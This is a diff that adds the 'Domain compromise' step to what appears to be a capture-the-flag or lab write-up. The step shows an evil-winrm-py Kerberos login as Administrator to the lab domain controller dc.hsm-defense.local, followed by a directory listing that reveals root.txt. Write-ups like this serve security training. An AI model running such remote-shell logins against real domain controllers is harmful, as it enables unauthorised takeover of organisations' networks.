@@ -886,5 +886,29 @@ SMB         dc.hsm-defense.local 445    dc               [*] grep -iv disabled /
 
 Domain compromise
 
+```python
+evil-winrm-py -k --no-pass -i dc.hsm-defense.local                                      
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'dc.hsm-defense.local:5985' as 'Administrator@HSM-DEFENSE.LOCAL'
+evil-winrm-py PS C:\Users\Administrator\Documents> cd ../Desktop
+evil-winrm-py PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----         9/1/2026  11:14 AM           3584 root.txt                                                               
+
+
+evil-winrm-py PS C:\Users\Administrator\Desktop>
+```
+
 
 
